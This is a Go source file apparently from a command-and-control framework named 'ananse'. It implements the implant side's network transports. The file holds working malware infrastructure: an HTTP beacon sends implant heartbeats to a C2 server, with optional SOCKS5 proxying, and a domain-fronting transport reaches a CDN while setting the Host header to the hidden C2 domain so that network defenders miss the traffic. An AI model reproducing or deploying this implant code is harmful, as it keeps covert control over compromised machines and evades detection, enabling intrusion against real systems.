package transport

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"time"

	"github.com/natx6/ananse/src/c2/implant/beacon"
	"golang.org/x/net/proxy"
)

// HTTPTransport implements Transport over standard HTTP/HTTPS.
type HTTPTransport struct {
	serverURL string
	token     string
	client    *http.Client
}

// NewHTTP creates an HTTP transport. If proxyAddr is non-empty, traffic
// is routed through the SOCKS5 proxy.
func NewHTTP(serverURL, token, proxyAddr string) *HTTPTransport {
	var transport *http.Transport

	if proxyAddr != "" {
		proxyURL, parseErr := url.Parse(proxyAddr)
		if parseErr == nil {
			dialer, err := proxy.FromURL(proxyURL, proxy.Direct)
			if err == nil {
				transport = &http.Transport{
					DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
						return dialer.Dial(network, addr)
					},
				}
			}
		}
	}

	if transport == nil {
		transport = &http.Transport{}
	}

	return &HTTPTransport{
		serverURL: serverURL,
		token:     token,
		client: &http.Client{
			Timeout:   30 * time.Second,
			Transport: transport,
		},
	}
}

func (h *HTTPTransport) Name() string { return "http" }

func (h *HTTPTransport) Close() error {
	h.client.CloseIdleConnections()
	return nil
}

func (h *HTTPTransport) Beacon(hb *beacon.ImplantHeartbeat) (*beacon.BeaconResponse, error) {
	body, err := json.Marshal(hb)
	if err != nil {
		return nil, fmt.Errorf("marshal heartbeat: %w", err)
	}

	req, err := http.NewRequest(http.MethodPost, h.serverURL+"/api/v1/beacon", bytes.NewReader(body))
	if err != nil {
		return nil, fmt.Errorf("create request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("x-implant-token", h.token)

	resp, err := h.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("http do: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		raw, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("server responded %d: %s", resp.StatusCode, string(raw))
	}

	var br beacon.BeaconResponse
	if err := json.NewDecoder(resp.Body).Decode(&br); err != nil {
		return nil, fmt.Errorf("decode response: %w", err)
	}
	return &br, nil
}

// DomainFrontTransport wraps an HTTP transport with domain fronting.
// It connects to the CDN front URL but sends the real C2 domain as
// the Host header, with matching TLS SNI.
type DomainFrontTransport struct {
	inner     *HTTPTransport
	frontURL  string
	frontHost string
}

// NewDomainFront creates a domain-fronted HTTP transport.
// frontURL is the CDN endpoint to connect to (e.g. https://cdn.example.com).
// frontHost is the Host header to send (the actual C2 domain).
func NewDomainFront(serverURL, token, frontURL, frontHost string) *DomainFrontTransport {
	front := &DomainFrontTransport{
		frontURL:  frontURL,
		frontHost: frontHost,
	}

	front.inner = &HTTPTransport{
		serverURL: serverURL,
		token:     token,
		client: &http.Client{
			Timeout: 30 * time.Second,
			Transport: &http.Transport{
				// Use a dialer that connects to the CDN but sends the C2 Host header
				DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
					// Override the destination — we want to connect to the front URL's host
					frontURLParsed, _ := url.Parse(frontURL)
					if frontURLParsed != nil {
						addr = frontURLParsed.Host
					}
					return net.DialTimeout(network, addr, 10*time.Second)
				},
			},
		},
	}

	return front
}

func (d *DomainFrontTransport) Name() string { return "domainfront" }

func (d *DomainFrontTransport) Close() error {
	d.inner.client.CloseIdleConnections()
	return nil
}

func (d *DomainFrontTransport) Beacon(hb *beacon.ImplantHeartbeat) (*beacon.BeaconResponse, error) {
	body, err := json.Marshal(hb)
	if err != nil {
		return nil, fmt.Errorf("marshal heartbeat: %w", err)
	}

	req, err := http.NewRequest(http.MethodPost, d.frontURL+"/api/v1/beacon", bytes.NewReader(body))
	if err != nil {
		return nil, fmt.Errorf("create request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("x-implant-token", d.inner.token)
	req.Host = d.frontHost // Override Host header

	resp, err := d.inner.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("http do: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		raw, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("server responded %d: %s", resp.StatusCode, string(raw))
	}

	var br beacon.BeaconResponse
	if err := json.NewDecoder(resp.Body).Decode(&br); err != nil {
		return nil, fmt.Errorf("decode response: %w", err)
	}
	return &br, nil
}
